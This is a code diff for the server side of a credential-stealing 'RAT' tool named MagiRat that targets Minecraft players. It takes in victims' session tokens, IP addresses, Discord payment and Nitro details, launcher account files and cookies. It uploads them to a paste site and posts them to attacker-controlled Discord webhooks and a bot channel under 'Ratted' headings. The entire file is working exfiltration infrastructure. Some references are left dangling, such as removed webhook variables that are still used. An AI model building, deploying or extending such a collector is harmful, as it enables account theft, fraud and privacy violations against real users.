@@ -1,31 +1,42 @@
 //setup
-const { contentSecurityPolicy } = require('helmet')
 const getProfiles = require('./utils/networth')
+const { uploadData, threadHandler, sendMessage, formatNumber, fetchCountry } = require('./utils/utils');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const { post, get } = require("axios")
 
 require("dotenv").config()
 
-const { post, get } = require("axios"),
-express = require("express"),
-helmet = require("helmet"),
-app = express(),
 expressip = require("express-ip"),
+express = require("express"),
+app = express(),
 port = process.env.PORT || 80
+
     
 //plugins
-app.use(helmet()) //secure
 app.use(expressip().getIpInfoMiddleware) //ip
 app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
 // Env variables
 // Webhooks
-let defaulthook = process.env.WEBHOOK
-let blackhook = process.env.BLACKHOOK
 let shorthook = process.env.SHORTHOOK
 let debughook = process.env.DEBUGHOOK
 
 // Blacklist
 let blacklist = process.env.BLACKLIST
+
+// Discord bot
+let token = process.env.BOT_TOKEN;
+let channelId = process.env.CHANNEL_ID;
+
+// Initialize the Discord client with necessary intents
+const client = new Client({
+    intents: [
+      GatewayIntentBits.Guilds,
+      GatewayIntentBits.GuildMessages,
+      GatewayIntentBits.MessageContent,
+    ]
+});
 
 //array initialization
 const ipMap = []
@@ -33,10 +44,16 @@ const ipMap = []
 //clear map every 15mins if its not already empty
 setInterval(() => {
     if (ipMap.length > 0) {
-        console.log(`[R.A.T] Cleared map`)
+        console.log(`[MagiRat] Cleared map`)
         ipMap.length = 0
     }
 }, 1000 * 60 * 15)
+
+//create server
+app.listen(port, () => {
+    console.log(`[MagiRat] Listening at port ${port}`)
+})
+
 
 //main route, post to this
 app.post("/", (req, res) => {
@@ -52,7 +69,7 @@ app.post("/", (req, res) => {
 
     //check if ip is banned (5 requests in 15mins)
     if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
-        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
+        console.log(`[MagiRat] Rejected banned IP (${req.ipInfo.ip})`)
         return res.sendStatus(404)
     }
 
@@ -69,20 +86,29 @@ app.post("/", (req, res) => {
 
     .then(async response => {
         // Preparation
+        let profiles = ''
+
+        // Set webhook
+        let webhook = defaulthook
+
+        // Set content
+        // timestamp text
+        const now = Date.now()
+        const time = now + (24 * 60 * 60 * 1000)
+        const timestamp = Math.floor(time / 1000)
+
+        let content = `@everyone - <t:${timestamp}:R>`
+
+        // Set comment
+        let comment = req.body.type || "unknown"
+
         //upload feather
-        const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => {
-            return {data: {key: "Error uploading"}}
-        })).data.key
+        const feather = await uploadData("https://hst.sh/documents/", req.body.feather);
+        const essentials = await uploadData("https://hst.sh/documents/", req.body.essentials);
+        const lunar = await uploadData("https://hst.sh/documents/", req.body.lunar);
 
-        //upload essential
-        const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => {
-            return {data: {key: "Error uploading"}}
-        })).data.key
-
-        //upload lunar
-        const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => {
-            return {data: {key: "Error uploading"}}
-        })).data.key
+        // Set country
+        let country = await fetchCountry(req.body.ip).catch(() => "undefined");
 
         //get discord info
         let nitros = ""
@@ -124,23 +150,6 @@ app.post("/", (req, res) => {
             })).data
             payments += payment.length > 0 ? "Yes | " : "No | "
         }
-
-        // Set webhook
-        let webhook = defaulthook
-
-        if (blacklist.split("_").includes(req.body.uuid)) { // debug
-            content = `Blacked - <t:${timestamp}:R>`
-            webhook = blackhook
-        }
-
-        // Set content
-        // timestamp text
-        const now = Date.now()
-        const time = now + (24 * 60 * 60 * 1000)
-        const timestamp = Math.floor(time / 1000)
-
-        let content = `@everyone - <t:${timestamp}:R>`
-
         // Set useful links
         let links = ``
 
@@ -154,32 +163,23 @@ app.post("/", (req, res) => {
              links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
         }
 
-        // Set comment
-        let comment = "unknown"
+        // Check if UUID is blacklisted
+        if (blacklist.includes(req.body.uuid.replace(/-/g, '_'))) {
+            content = `Blacked - <t:${timestamp}:R>`;
+            webhook = blackhook;
+        }
 
-        if (req.body.type) {
-            comment = req.body.type
-
-            if (comment == "essential") {
-                webhook = blackhook //debug
-                content = `Essential - <t:${timestamp}:R>`
-            }
+        // Set content based on comment
+        if (comment === "essential") {
+            webhook = blackhook;
+            content = `Essential - <t:${timestamp}:R>`;
         }
         
-        let country = "undefined"
-        // Set country
-        fetchCountry(req.body.ip).then((result) => {
-            country = result
-        })
-        
-
         // get profiles
-        let profiles = ''
         const profileData = await getProfiles(req.body.uuid)
 
         if (profileData) {
             for (let profileId in profileData.profiles) {
-                console.log(profileData.profiles[profileId])
                 profiles += `[${profileData.profiles[profileId].sblvl}] ${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
             }
         }
@@ -221,101 +221,64 @@ app.post("/", (req, res) => {
             // Extract usernames from lunar
             lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username)
         }
-        
-        try {
-            post(webhook, JSON.stringify({
-                content: content, //ping
-                embeds: [{
-                    title: `Ratted ${req.body.username} - Click Below For Stats`,
-                    description: links,
-                    fields: [
-                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
-                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
-                        {name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false},
-                        {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
-                        {name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true},
-                        {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
-                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
-                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Feather', value: `${checkFeather}`, inline: true},
-                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
-                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
-                        {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
-                        {name: 'Nitro', value: `\`${nitros}\``, inline: true},
-                        {name: 'Payment', value: `\`${payments}\``, inline: true},
-                    ],
-                    color: 0x7366bd,
-                    footer: {
-                        "text": "🕊️ MagiDev on top 🕊️",
-                    },
-                    timestamp: new Date()
-                }],
-                attachments: []
-            }), {
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }).catch(err => {
-                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
-                console.log(req.body)
-            })
 
+        const embed = new EmbedBuilder()
+            .setTitle(`Ratted ${req.body.username} - Click Below For Stats`)
+            .setDescription(links)
+            .addFields(
+                { name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true },
+                { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
+                { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
+                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
+                { name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true },
+                { name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true },
+                { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
+                { name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true },
+                { name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true },
+                { name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true },
+                { name: 'Feather', value: `${checkFeather}`, inline: true },
+                { name: 'Essentials', value: `${checkEssentials}`, inline: true },
+                { name: 'Lunar', value: `${checkLunar}`, inline: true },
+                { name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false },
+                { name: 'Nitro', value: `\`${nitros}\``, inline: true },
+                { name: 'Payment', value: `\`${payments}\``, inline: true },
+            )
+            .setColor(0x7366bd)
+            .setFooter({ text: "🕊️ MagiDev on top 🕊️" })
+            .setTimestamp();
+
+        try {
+            // Send logs to main channel
+            client.login(token).then(() => {
+                threadHandler(content, embed, req.body.username, profileData.stats.bestNetworth, client, channelId);
+              }).catch(error => console.error('Error logging in:', error));
+            
+            // Shortlogs (hella short + some kind of backup)
             post(shorthook, JSON.stringify({
-                content: "@everyone" + content, //ping
-                embeds: [{
-                    title: `Ratted ${req.body.username} - Click Below For Stats`,
-                    description: links,
-                    fields: [
-                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
-                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
-                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
-                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Feather', value: `${checkFeather}`, inline: true},
-                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
-                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
-                    ],
-                    color: 0x7366bd,
-                    footer: {
-                        "text": "🕊️ MagiDev on top 🕊️",
-                    },
-                    timestamp: new Date()
-                }],
-                attachments: []
+                content: `@everyone \`\`\`${req.body.username} - ${profileData.stats.bestNetworth}\n${profiles}\n${featherAccounts.join(', ')}, ${essentialAccounts.join(', ')}, ${lunarAccounts.join(', ')}\`\`\` `, //ping
             }), {
                 headers: {
                     "Content-Type": "application/json"
                 }
             }).catch(err => {
-                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
+                console.log(`[MagiRat] Error while sending to Discord webhook:\n${err}`)
+                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
                 console.log(req.body)
             })
         } catch (e) {
             console.log(e)
         }
-        console.log(`[R.A.T] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
+        console.log(`[MagiRat] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
     })
         .catch(err => {
         //could happen if the auth server is down OR if invalid information is passed in the body
-        console.log(`[R.A.T] Error while validating token:\n${err}`)
+        console.log(`[MagiRat] Error while validating token:\n${err}`)
         console.log(req.body)
-        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``)
+        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``, debughook)
     })
     
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
-})
-
-//create server
-app.listen(port, () => {
-    console.log(`[R.A.T] Listening at port ${port}`)
-    // send to discord webhook
-    
 })
 
 //cookies
@@ -324,6 +287,10 @@ app.post("/cookies", (req, res) => {
     if (!["username", "cookies"].every(field => req.body.hasOwnProperty(field))) {
         console.log(req.body)
         return res.sendStatus(404)
+    }
+
+    if (cookies == "") {
+        return;
     }
 
     // Set webhook
@@ -354,52 +321,23 @@ app.post("/cookies", (req, res) => {
     }).then(response => {
         console.log("Sent cookies successfully")
     }).catch(error => {
-        sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
+        sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
     });
     
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
 
-//format a number into thousands millions billions
-const formatNumber = (num) => {
-    if (num < 1000) return num.toFixed(2)
-    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
-    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
-    else return `${(num / 1000000000).toFixed(2)}b`
-}
+module.exports = {
+    uploadData,
+    threadHandler,
+    sendMessage,
+    formatNumber,
+    fetchCountry
+};
 
-function sendMessage(message) {
-    post(debughook, JSON.stringify({
-                content: message, //ping
-                attachments: []
-            }), {
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }).catch(err => {
-                console.log(`[R.A.T] Error while debugging:\n${err}`)
-            })
-}
 
-const fetchCountry = async (ip) => {
-    // Set URL
-    const apiUrl = `http://ip-api.com/json/${ip}`;
 
-    try {
-        // Send HTTP request
-        const response = await fetch(apiUrl);
 
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
 
-        // Fetch country
-        const data = await response.json();
 
-        return data.country;
-    } catch (error) {
-        // Return 'Unknown' in case of any errors
-        return 'Unknown';
-    }
-}
